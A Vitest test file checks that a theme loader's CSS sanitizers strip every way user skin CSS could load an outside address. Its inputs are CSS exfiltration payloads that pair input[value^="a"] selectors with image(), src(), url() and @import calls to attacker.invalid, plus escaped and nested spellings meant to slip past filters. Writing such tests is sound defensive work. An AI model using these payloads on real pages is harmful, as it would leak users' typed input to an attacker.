/**
 * @vitest-environment node
 *
 * skin.css (Theme API v2) may use any selector, so it can match attribute
 * values (`input[value^="a"]`). What keeps that on the page is that no
 * declaration may load anything: url(), image-set(), @import, @font-face
 * sources, and image() and src(), which take the address as a plain string,
 * are removed in every spelling.
 */
import { describe, it, expect } from 'vitest';
import { sanitizeSkinCSS, sanitizeThemeCSS } from '@/lib/theme-loader';

const HOST = 'attacker.invalid';

describe('skin.css: declarations that would load an address', () => {
  it('removes image("…")', () => {
    const out = sanitizeSkinCSS('input[value^="a"] { background: image("https://attacker.invalid/a"); }').css;
    expect(out).not.toContain('attacker.invalid');
  });

  it('removes src("…")', () => {
    const out = sanitizeSkinCSS('input[value^="a"] { background: src("https://attacker.invalid/a"); }').css;
    expect(out).not.toContain('attacker.invalid');
  });

  it('keeps removing url() in every spelling it knows (control)', () => {
    for (const css of [
      'a { background: url(https://attacker.invalid/a); }',
      'a { background: url(//attacker.invalid/a); }',
      'a { background: u\\72l(https://attacker.invalid/a); }',
      'a { background: -webkit-image-set(url(https://attacker.invalid/a) 1x); }',
      '@import "https://attacker.invalid/x.css";',
    ]) {
      const out = sanitizeSkinCSS(css).css;
      expect(/url\(|image-set\(|@import/i.test(out)).toBe(false);
    }
  });

  it.each([
    ['upper case', 'a { background: IMAGE("https://attacker.invalid/a"); }'],
    ['mixed case', 'a { background: Src("https://attacker.invalid/a"); }'],
    ['space before the bracket', 'a { background: image ("https://attacker.invalid/a"); }'],
    ['an escape in image', 'a { background: im\\61ge("https://attacker.invalid/a"); }'],
    ['an escape in src', 'a { background: \\73rc("https://attacker.invalid/a"); }'],
    ['an escaped letter', 'a { background: ima\\ge("https://attacker.invalid/a"); }'],
    ['inside @media', '@media (min-width: 1px) { input[value^="a"] { background: image("https://attacker.invalid/a"); } }'],
    ['inside @supports', '@supports (display: grid) { input[value^="a"] { background: src("https://attacker.invalid/a"); } }'],
    ['inside cross-fade()', 'a { background: cross-fade(image("https://attacker.invalid/a"), src("https://attacker.invalid/b") 50%); }'],
    ['inside -webkit-cross-fade()', 'a { background: -webkit-cross-fade(url(https://attacker.invalid/a), image("https://attacker.invalid/b"), 50%); }'],
    ['with modifiers', 'a { background: src("https://attacker.invalid/a" crossorigin(anonymous)); }'],
  ])('%s', (_name, css) => {
    expect(sanitizeSkinCSS(css).css).not.toContain(HOST);
  });

  it('leaves element(), which names an element of the page and no address', () => {
    expect(sanitizeSkinCSS('a { background: element(#logo); }').css).toContain('element(#logo)');
  });

  it('leaves the rest of the rule and the skin alone', () => {
    const out = sanitizeSkinCSS('.toolbar { color: red; background: image("https://attacker.invalid/a"); } .list { color: blue; }').css;
    expect(out).toContain('color: red');
    expect(out).toContain('.list { color: blue; }');
  });
});

describe('theme.css: the same functions in a custom property', () => {
  it('removes them', () => {
    const out = sanitizeThemeCSS(':root { --bg: image("https://attacker.invalid/a"); --fg: src("https://attacker.invalid/b"); --c: #123; }').css;
    expect(out).not.toContain(HOST);
    expect(out).toContain('--c: #123');
  });
});
